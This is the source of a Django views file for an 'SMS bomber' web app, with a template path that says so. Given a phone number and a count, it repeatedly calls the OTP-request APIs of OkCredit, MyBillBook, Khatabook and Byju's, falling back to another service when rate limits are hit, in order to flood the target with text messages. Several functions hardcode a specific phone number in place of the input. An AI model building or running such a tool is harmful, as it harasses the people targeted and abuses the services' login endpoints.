from django.shortcuts import render

# Create your views here.
from django.http.response import HttpResponse
from django.shortcuts import render
import requests,json

# Create your views here.


def ok_credit(phoneno):
  url="https://web.okcredit.in/api/authn/v1.0/otp:request"
  payload='{"mobile":"6371486421","mode":0}'
  headers = {
    'Content-Type': 'application/json'
  }
  response = requests.request("POST", url, headers=headers, data=payload)
  return response.text

  ''' Reseponse :=======>  Suss=====>  {"existing_user":true,"login_count":0}  
      Errors :============> Failed =====> {"error":"Rate Limit Exceeded. Please try after some time","errors":["Rate Limit Exceeded. Please try after some time"]}
  '''
# MY BILL BOOK STRTS
def mybillbook(phoneno):
  url = "https://mybillbook.in/api/web/request_otp"
  payload="{\"mobile_number\":\""+phoneno+"\",\"source\":\"landing\"}"
  headers = {
    'Content-Type': 'application/json'
  }
  response = requests.request("POST", url, headers=headers, data=payload)
  return response.text
  ''' Reseponse :=======>  Suss=====>  {"existing_user":true,"login_count":0}  
      Errors :============> Failed =====> {"error":"Rate Limit Exceeded. Please try after some time","errors":["Rate Limit Exceeded. Please try after some time"]}
  '''
def KhataBook_sms(phoneno):
  url = "https://api.khatabook.in/v1/auth/request-otp"

  payload = "{\"country_code\":\"+91\",\"phone\":\"6371486421\",\"app_signature\":\"Jc/Zu7qNqQ2\"}"
  headers = {
      'content-type': "application/json",
      'cache-control': "no-cache",
      'postman-token': "089a568f-4b7b-e556-0bc5-9c1184ca6307"
      }

  response = requests.request("POST", url, data=payload, headers=headers)
  return response.text
def Byjus_sms(phoneno):
  url = "https://bcas-prod.byjusweb.com/api/v2/send-otp"

  payload = "{\"phoneNumber\": \"6371486421\",\r\n\"page\": \"free-trial-classes\"}"
  headers = {
      'content-type': "application/json",
      'cache-control': "no-cache",
      'postman-token': "8384d04b-9883-7f24-cda9-021b529e11c4"
      }

  response = requests.request("POST", url, data=payload, headers=headers)
  return response.text

def index(request):
    if request.method=="POST":
        phoneno=request.POST['phono']
        nos=request.POST['nos']
        nos=int(nos)
        for i in range(nos+1):
            if(i%2==0):
                res=ok_credit(phoneno)
                res=json.dumps(res)
                if "error" in res :
                  res=KhataBook_sms(phoneno)
                  res=json.dumps(res)
                  if "error" in res :
                    Byjus_sms(phoneno)
            else:
                res=mybillbook(phoneno)
                res=json.dumps(res)
                if "error" in res :
                  res=KhataBook_sms(phoneno)
                  res=json.dumps(res)
                  if "error" in res :
                    Byjus_sms(phoneno)
        return HttpResponse(1)
    else:
        return render(request,"bomber/sms_bomber.html")
